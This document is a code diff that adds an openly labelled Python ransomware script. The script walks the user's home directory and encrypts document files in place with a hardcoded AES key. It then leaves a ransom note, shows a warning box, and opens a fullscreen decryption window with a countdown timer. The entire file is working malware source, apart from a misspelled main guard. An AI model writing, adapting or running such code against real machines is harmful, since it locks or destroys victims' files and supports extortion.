@@ -1,0 +1,194 @@
+import os
+import urllib.request
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import base64
+import ctypes
+import tkinter as tk
+from tkinter import messagebox
+from PIL import Image, ImageTk
+import argparse
+
+# Allowed file extensions for encryption
+DOCUMENT_EXTENSIONS = ['.txt', '.docx', '.pdf', '.xlsx', '.pptx', '.csv']
+
+# Define the key and ensure it is padded to 16 bytes (AES-128)
+original_key = b"patanahi"  # 8 bytes
+key = original_key.ljust(16, b' ')  # Pad to 16 bytes (128-bit)
+
+def encrypt_file(file_path, key):
+    try:
+        with open(file_path, 'rb') as file:
+            data = file.read()
+
+        cipher = AES.new(key, AES.MODE_CBC)
+        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
+        iv = base64.b64encode(cipher.iv).decode('utf-8')  # Encode IV in base64 for storage
+        ct = base64.b64encode(ct_bytes).decode('utf-8')  # Encode ciphertext in base64
+
+        # Write encrypted data (IV and ciphertext) to the file
+        with open(file_path, 'wb') as file:
+            file.write(f"{iv}\n{ct}".encode())  # Write as bytes to avoid text issues
+        print(f"Encrypted: {file_path}")
+    except Exception as e:
+        print(f"Failed to encrypt {file_path}: {e}")
+
+def decrypt_file(file_path, key):
+    try:
+        with open(file_path, 'rb') as file:
+            lines = file.read().split(b'\n')
+            iv = base64.b64decode(lines[0].strip())
+            ct = base64.b64decode(lines[1].strip())
+
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        pt = unpad(cipher.decrypt(ct), AES.block_size)
+
+        with open(file_path, 'wb') as file:
+            file.write(pt)
+        print(f"Decrypted: {file_path}")
+    except Exception as e:
+        print(f"Failed to decrypt {file_path}: {e}")
+
+def ransomware_action():
+    target_dir = os.path.expanduser('~')
+
+    print("Encrypting document files...")
+    for root, dirs, files in os.walk(target_dir):
+        for file in files:
+            file_path = os.path.join(root, file)
+            if any(file.endswith(ext) for ext in DOCUMENT_EXTENSIONS):
+                try:
+                    encrypt_file(file_path, key)
+                except Exception as e:
+                    print(f"Failed to encrypt {file_path}: {e}")
+
+    # Create the ransom note
+    note_path = os.path.join(target_dir, "note.txt")
+    with open(note_path, 'w', encoding='utf-8') as note:
+        note.write(
+            "Your files have been encrypted.\n"
+            "To decrypt them, you need the correct decryption key.\n"
+            "Run the program again and enter the key when prompted.\n\n"
+            "TU TU GAYA BETA AB KIYA KARE GA\n"
+            "CAL AB BIRYANI KHELA CAL SHABASH!"
+        )
+    print(f"Ransom note created: {note_path}")
+
+    ctypes.windll.user32.MessageBoxW(
+        0,
+        "All your document files in your home directory have been encrypted.\n"
+        "Run this program again and enter the correct key to decrypt.\n\n"
+        "TU TU GAYA BETA AB KIYA KARE GA\n"
+        "CAL AB BIRYANI KHELA CAL SHABASH!",
+        "Ransomware Notice",
+        1,
+    )
+
+def gui_decryption():
+    """Opens a GUI window for decryption."""
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+
+    # Add the background image
+    image_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR6dURxRHO6XARFGD9UdON8k0pUwnjps2S0Cdn5_v5DLg&s"
+    bg_image_path = "background.png"  # Temporary local filename
+
+    # Download the image locally
+    try:
+        urllib.request.urlretrieve(image_url, bg_image_path)
+    except Exception as e:
+        print(f"Error downloading image: {e}")
+        return
+
+    # Load the background image
+    try:
+        bg_image = Image.open(bg_image_path)
+        bg_image = bg_image.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.Resampling.LANCZOS)
+        bg_photo = ImageTk.PhotoImage(bg_image)
+
+        background_label = tk.Label(root, image=bg_photo)
+        background_label.image = bg_photo  # Keep a reference to the image
+        background_label.place(relwidth=1, relheight=1)
+    except Exception as e:
+        print(f"Error loading image: {e}")
+
+    # Timer setup
+    timer_label = tk.Label(root, text="Time remaining: 60 seconds", bg='black', fg='white', font=("Arial", 16))
+    timer_label.pack(pady=20)
+
+    # Function to update the timer
+    def update_timer(count):
+        if count > 0:
+            timer_label.config(text=f"Time remaining: {count} seconds")
+            root.after(1000, update_timer, count - 1)  # Update every second
+
+    # Start the timer
+    update_timer(60)
+
+    def decrypt_files():
+        user_key = entry.get().encode()
+        expected_key = original_key.ljust(16, b' ')  # Pad "patanahi" to 16 bytes
+
+        target_dir = os.path.expanduser('~')
+
+        if user_key == expected_key:
+            print("Decrypting document files...")
+            for root_dir, dirs, files in os.walk(target_dir):
+                for file in files:
+                    file_path = os.path.join(root_dir, file)
+                    if any(file.endswith(ext) for ext in DOCUMENT_EXTENSIONS):
+                        try:
+                            decrypt_file(file_path, key)
+                        except Exception as e:
+                            print(f"Failed to decrypt {file_path}: {e}")
+
+            messagebox.showinfo("Success", "All document files decrypted successfully.")
+            root.destroy()  # Close the GUI window
+        else:
+            messagebox.showerror("Error", "Incorrect key! Decryption failed.")
+
+    label = tk.Label(root, text="Enter the decryption key:", bg='black', fg='white', font=("Arial", 16))
+    label.pack(pady=20)
+
+    entry = tk.Entry(root, bg='white', fg='black', font=("Arial", 14))
+    entry.pack(pady=20)
+
+    decrypt_button = tk.Button(root, text="Decrypt Files", bg='red', fg='white', font=("Arial", 14), command=decrypt_files)
+    decrypt_button.pack(pady=20)
+
+    root.mainloop()
+
+def decrypt_files_cli():
+    """Command-line interface for decryption."""
+    parser = argparse.ArgumentParser(description="Decrypt files using the provided key.")
+    parser.add_argument('key', type=str, help='Decryption key')
+    args = parser.parse_args()
+
+    user_key = args.key.encode().ljust(16, b' ')  # Pad the key to 16 bytes
+    target_dir = os.path.expanduser('~')
+
+    if user_key == key:
+        print("Decrypting document files...")
+        for root_dir, dirs, files in os.walk(target_dir):
+            for file in files:
+                file_path = os.path.join(root_dir, file)
+                if any(file.endswith(ext) for ext in DOCUMENT_EXTENSIONS):
+                    try:
+                        decrypt_file(file_path, key)
+                    except Exception as e:
+                        print(f"Failed to decrypt {file_path}: {e}")
+        print("Decryption completed successfully.")
+    else:
+        print("Incorrect key! Decryption failed.")
+
+def main():
+    """Main function to execute the ransomware script."""
+    ransomware_action()
+    gui_decryption()  # Open the decryption GUI
+
+if _name_ == "_main_":
+    import sys
+    if len(sys.argv) > 1:
+        decrypt_files_cli()
+    else:
+        main() 
